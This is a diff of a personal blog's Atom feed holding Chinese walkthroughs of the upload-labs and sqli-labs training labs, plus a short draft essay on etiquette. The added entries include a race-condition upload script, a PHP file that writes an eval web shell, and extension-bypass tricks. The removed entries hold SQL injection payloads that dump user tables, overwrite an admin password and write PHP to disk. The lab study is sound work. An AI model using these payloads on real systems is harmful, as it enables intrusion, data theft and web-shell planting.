@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-11-26T14:24:50.855Z</updated>
+  <updated>2022-11-27T06:15:42.825Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,75 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>upload-labs_18+19</title>
+    <link href="http://example.com/2022/11/27/upload-labs_18+19/"/>
+    <id>http://example.com/2022/11/27/upload-labs_18+19/</id>
+    <published>2022-11-26T16:00:00.000Z</published>
+    <updated>2022-11-27T06:15:42.825Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关burp发挥的作用很大</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>这一关的提示是代码审计，通过尝试，可以发现，是白名单验证的方式。<br>代码他是先将图片上传上去，才开始进行判断后缀名、二次渲染。如果我们在上传上去的一瞬间访问这个文件，那他就不能对这个文件删除、二次渲染。这就相当于我们打开了一个文件，然后再去删除这个文件，就会提示这个文件在另一程序中打开无法删除。<br>那么我们的方法是：尝试使用竞争条件上传，用burp一直上传文件，用python脚本一直方位临时文件，临时文件内容为我们写入一句话到它的目录。<br>其中python脚本如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(i,end=<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">            test = requests.get(<span class="string">&quot;http://192.168.44.129:9096/upload/upload/success.php&quot;</span>)         //写入上传位置路径地址</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;260ca9dd8a4577fc00b7bd5810298076&quot;</span> <span class="keyword">in</span> test.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>上传的文件内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(success);</span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_REQUEST[123])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用burp抓包-&gt;发送到Intruder<br><img src="/simg/upload-labs_18.png" alt=" "><br>Intruder中-&gt;Payloads  修改为如图所示<br><img src="/simg/upload-labs_18_2.png" alt=" "><br>最后同时运行python脚本和burp的start attack<br>则运行成功。</p><h2 id="第19关"><a href="#第19关" class="headerlink" title="第19关"></a>第19关</h2><p>也是和18关原理相同</p><p>这2关可以参考这个博客的另一个方法<br><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">17,18</a></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我自己觉得这两关是完成的不太好的，有各种各样的因素，以后再来补充吧~</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a></p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这一关burp发挥的作用很大&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
+    
+    
+    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
+    
+    <category term="burp" scheme="http://example.com/tags/burp/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>upload-labs_20</title>
+    <link href="http://example.com/2022/11/27/upload-labs_20/"/>
+    <id>http://example.com/2022/11/27/upload-labs_20/</id>
+    <published>2022-11-26T16:00:00.000Z</published>
+    <updated>2022-11-27T05:48:31.175Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关要轻松一些了</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第1种方法"><a href="#第1种方法" class="headerlink" title="第1种方法"></a>第1种方法</h2><p>截断move_uploaded_file()函数中的img_path是由post参数save_name控制的，可以在save_name利用%00截断(注意php版本低于5.3)<br>具体实现是，上传文件为图片马，将保存文件的名称后缀修改为.php 注意最后有一个空格<br>然后抓包，在Hex里修改空格20为00<br>可以看到上传成功，蚁剑连接也成功</p><h2 id="第2种方法"><a href="#第2种方法" class="headerlink" title="第2种方法"></a>第2种方法</h2><p>move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 &#x2F;.<br>所以可以抓包，然后在保存文件末尾用&#x2F;.<br>这样我们可以看到，文件同样上传成功，蚁剑也连接成功</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这一关的方法要简单一些了，但只是学会了方法，背后的原理仍需掌握。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a><br><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这一关要轻松一些了&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
+    
+    
+    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
+    
+    <category term="蚁剑" scheme="http://example.com/tags/%E8%9A%81%E5%89%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>upload-labs_21</title>
+    <link href="http://example.com/2022/11/27/upload-labs_21/"/>
+    <id>http://example.com/2022/11/27/upload-labs_21/</id>
+    <published>2022-11-26T16:00:00.000Z</published>
+    <updated>2022-11-27T06:12:41.958Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关用到的是数组绕过</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>这道题需要代码审计，通过审计发现，先检查文件类型，后检查是否上传了文件名没有则为文件的名字，判断是否为数组，若不是则以点分割返回一个数组，取数组最后一位数为后缀，文件保存为reset输出数组第一个数，和最后一位数保存。</p><p>具体实现：<br>上传图片马文件，然后保存文件后缀改为php<br>之后抓包，然后如下图所示修改<br><img src="/simg/upload-labs_21.png" alt=" "><br>最后放包，就上传成功了，蚁剑也连接成功</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不仅要会方法，还要懂原理。通过这21关的训练，其实可以发现，白名单比黑名单安全性更高。<br>实战需要自己测试！</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a><br><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这一关用到的是数组绕过&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
+    
+    
+    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
+    
+    <category term="蚁剑" scheme="http://example.com/tags/%E8%9A%81%E5%89%91/"/>
+    
+  </entry>
   
   <entry>
     <title>upload-labs_11-16</title>
@@ -82,6 +151,29 @@
     <category term="随想" scheme="http://example.com/tags/%E9%9A%8F%E6%83%B3/"/>
     
     <category term="爱国" scheme="http://example.com/tags/%E7%88%B1%E5%9B%BD/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>浅谈礼仪的对象</title>
+    <link href="http://example.com/2022/11/26/%E7%A4%BC%E4%BB%AA%E7%9A%84%E5%AF%B9%E8%B1%A1/"/>
+    <id>http://example.com/2022/11/26/%E7%A4%BC%E4%BB%AA%E7%9A%84%E5%AF%B9%E8%B1%A1/</id>
+    <published>2022-11-25T16:00:00.000Z</published>
+    <updated>2022-11-27T06:14:33.229Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>前些年在某本杂志上看到太宰治说的一段话。那段话大致意思是说：我们有晚辈对长辈的礼仪，学生对老师的礼仪；却没有长辈对晚辈的礼仪，老师对学生的礼仪。给我带来了极大的震撼，也是因此产生了写这篇文章的想法。<br>文章还在草稿中…不必看</p><span id="more"></span><h1 id="理所应当的礼仪"><a href="#理所应当的礼仪" class="headerlink" title="理所应当的礼仪"></a>理所应当的礼仪</h1><p>像我这样愚笨之人，从不会思考这样的事，只把这样的礼仪当作是理所当然的事。<br>也即，我被社会，所同化了。<br>为什么这么说呢？<br>仔细思考一下便知，我们的周围，无不充斥着晚辈应当尊敬长辈，学生应当尊重老师，这样的氛围。比如什么一日为师终生为父这样的话。<br>但从来没有长辈尊重晚辈，老师尊重学生的话出现。现实中也常常看到这样的例子，有的老师羞辱学生而学生不敢还嘴，长辈打骂晚辈却不会受到谴责。<br>仿佛只要是成为了这样一种强势地位的人，就能为所欲为。<br>说到底，为什么要对长辈，老师这样的人有尊重的礼仪呢？<br>这些礼仪最初是由什么人提出的呢？难道其实说，这不过是强者剥削弱者的一种手段吗？<br>礼仪道德的遵守与否，应当遵循自愿，而不是成为一种强制行为。对于敬爱的长辈老师，晚辈学生可以自主选择遵守礼仪。对于不值得尊重的，也可以选择不遵守。而不是依靠这样一种强势地位去压迫弱势地位的晚辈学生。<br>说到底，晚辈学生，根本上而言，没有选择权。一切都是上位者提出的规则。他们受到礼仪，只是单纯地享受。<br>未完待续…</p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;前些年在某本杂志上看到太宰治说的一段话。那段话大致意思是说：我们有晚辈对长辈的礼仪，学生对老师的礼仪；却没有长辈对晚辈的礼仪，老师对学生的礼仪。给我带来了极大的震撼，也是因此产生了写这篇文章的想法。&lt;br&gt;文章还在草稿中…不必看&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="随想" scheme="http://example.com/categories/%E9%9A%8F%E6%83%B3/"/>
+    
+    
+    <category term="随想" scheme="http://example.com/tags/%E9%9A%8F%E6%83%B3/"/>
+    
+    <category term="礼仪" scheme="http://example.com/tags/%E7%A4%BC%E4%BB%AA/"/>
     
   </entry>
   
@@ -263,11 +355,11 @@
     <category term="蚁剑" scheme="http://example.com/categories/upload-labs/%E8%9A%81%E5%89%91/"/>
     
     
+    <category term="工具" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7/"/>
+    
     <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
     
     <category term="安装" scheme="http://example.com/tags/%E5%AE%89%E8%A3%85/"/>
-    
-    <category term="工具" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7/"/>
     
   </entry>
   
@@ -387,106 +479,6 @@
     <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
     
     <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>sqli-labs_42-45</title>
-    <link href="http://example.com/2022/11/19/sqli-labs_42-45/"/>
-    <id>http://example.com/2022/11/19/sqli-labs_42-45/</id>
-    <published>2022-11-18T16:00:00.000Z</published>
-    <updated>2022-11-19T09:04:00.739Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末学习的开始</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>测试并判断注入类型<br>查看源码，在login.php中注意到这样的语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br></pre></td></tr></table></figure><p>我们可以发现，username被过滤了，但是password没有被过滤<br>因此我们可以考虑从password处进行注入<br>然后，通过对堆叠注入的尝试，我们发现也是可行的。<br>于是，我们可以有两种方式。<br>一是常规方式，二是通过堆叠注入修改管理员密码从而登录</p></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),2 from users #</span><br></pre></td></tr></table></figure></li><li><p>修改管理员密码(可以直接做)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;update users set password=&#x27;111111&#x27;  where username=&#x27;admin&#x27;#</span><br></pre></td></tr></table></figure></li></ol><h2 id="第43关"><a href="#第43关" class="headerlink" title="第43关"></a>第43关</h2><p>与第42关差不多，只不过闭合方式为’)</p><h2 id="第44关"><a href="#第44关" class="headerlink" title="第44关"></a>第44关</h2><p>与第42关差不多，只是不能使用报错注入</p><h2 id="第45关"><a href="#第45关" class="headerlink" title="第45关"></a>第45关</h2><p>与第43关差不多，只是闭合方式为’)</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>向前走,不回头~</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_43395215/article/details/108245668">sqli-labs(38-53)</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;周末学习的开始&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
-    
-    
-    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>sqli-labs_46+47</title>
-    <link href="http://example.com/2022/11/19/sqli-labs_46+47/"/>
-    <id>http://example.com/2022/11/19/sqli-labs_46+47/</id>
-    <published>2022-11-18T16:00:00.000Z</published>
-    <updated>2022-11-19T09:41:37.476Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前面连续几关相似，这一回终于有新内容了。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>测试并判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1</span><br></pre></td></tr></table></figure><p>显示有id,username,password的表格<br>可以直接得到需要的信息，但在实际情况中，这样是不够的。<br>也可以倒序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 desc</span><br></pre></td></tr></table></figure><p>这里可用的注入方式很多<br>报错注入，时间盲注，双查询注入，函数注入<br>下面以报错注入为例</p></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br><span class="line">?sort=-1 and updatexml(1,concat(0x7e,version(),0x7e),1)</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),0x7e),1)</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),0x7e),1)</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select concat_ws(username,&#x27;:&#x27;,password) from users limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure></li><li><p>写入查询记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-46\\111.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+</span><br></pre></td></tr></table></figure><p>用十六进制代替<?php phphinfo();?></p></li></ol><h2 id="第47关"><a href="#第47关" class="headerlink" title="第47关"></a>第47关</h2><p>与第46关相比差不多，只是闭合方式为’</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有些时候注入的方式不止一种，我们只需选择自己最擅长以及最迅速有效的方法即可</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">sqli-labs大详解（完结）</a><br><a href="https://blog.csdn.net/qq_43395215/article/details/108245668">sqli-labs(38-53)</a></p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;前面连续几关相似，这一回终于有新内容了。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
-    
-    
-    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>sqli-labs_48-53</title>
-    <link href="http://example.com/2022/11/19/sqli-labs_48-53/"/>
-    <id>http://example.com/2022/11/19/sqli-labs_48-53/</id>
-    <published>2022-11-18T16:00:00.000Z</published>
-    <updated>2022-11-19T10:00:52.194Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>久违的盲注</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>测试并判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;   无信息，只知道出错</span><br></pre></td></tr></table></figure><p>可以发现，现在无法使用报错注入了<br>那我们就要用到久违的盲注了。</p></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and if((ascii(substr(database(),1,1))=115),sleep(10),1) --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database()) limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1);--+</span><br></pre></td></tr></table></figure></li></ol><h2 id="第49关"><a href="#第49关" class="headerlink" title="第49关"></a>第49关</h2><p>与第48关相比差不多，只是闭合方式为’</p><h2 id="第50关"><a href="#第50关" class="headerlink" title="第50关"></a>第50关</h2><p>与第48关相比差不多，因为源码中存在mysqli_multi_query,可以堆叠注入</p><h2 id="第51关"><a href="#第51关" class="headerlink" title="第51关"></a>第51关</h2><p>与第50关相比差不多，只是闭合方式为’</p><h2 id="第52关"><a href="#第52关" class="headerlink" title="第52关"></a>第52关</h2><p>与第50关相比差不多</p><h2 id="第53关"><a href="#第53关" class="headerlink" title="第53关"></a>第53关</h2><p>与第51关相比差不多</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>常规操作</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">sqli-labs大详解（完结）</a></p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;久违的盲注&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
-    
-    
-    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>sqli-labs_54-57</title>
-    <link href="http://example.com/2022/11/19/sqli-labs_54-57/"/>
-    <id>http://example.com/2022/11/19/sqli-labs_54-57/</id>
-    <published>2022-11-18T16:00:00.000Z</published>
-    <updated>2022-11-19T13:44:05.053Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>知识基本都已经学完了，从这里开始就是训练了。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>测试并判断注入类型<br>就像回到了开始~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1  显示正常</span><br><span class="line">?id=1&#x27;  无错误信息，但显示不正常</span><br></pre></td></tr></table></figure><p>推测闭合方式为’</p></li><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;order by 4 --+  无错误信息，但显示不正常</span><br><span class="line">?id=1&#x27;order by 3 --+  显示正常</span><br></pre></td></tr></table></figure><p>字段数为3</p></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenages&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;8k8nkr7hq5&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1) union select 1,group_concat(secret_2GAF),3 from 8k8nkr7hq5 --+</span><br></pre></td></tr></table></figure></li></ol><h2 id="第55关"><a href="#第55关" class="headerlink" title="第55关"></a>第55关</h2><p>与第54关差不多，闭合方式变更为)</p><h2 id="第56关"><a href="#第56关" class="headerlink" title="第56关"></a>第56关</h2><p>与第54关差不多，闭合方式变更为’)</p><h2 id="第57关"><a href="#第57关" class="headerlink" title="第57关"></a>第57关</h2><p>与第54关差不多，闭合方式变更为”</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>限制了次数的玩法还挺刺激的hh</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;知识基本都已经学完了，从这里开始就是训练了。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
-    
-    
-    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
     
   </entry>
   
